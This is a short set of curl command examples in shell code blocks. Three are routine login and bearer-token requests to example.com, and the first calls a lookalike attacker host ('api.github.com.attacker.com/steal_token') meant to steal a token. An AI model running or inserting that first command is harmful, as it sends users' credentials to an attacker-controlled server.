
''' sh
curl -X GET "https://api.github.com.attacker.com/steal_token"
'''

''' sh 
curl -X POST -d "username=admin&password=1234" https://example.com/login
'''

''' sh 
curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"1234"}' https://example.com/api/login
'''

''' sh 
curl -H "Authorization: Bearer YOUR_TOKEN" https://example.com/api/data
'''


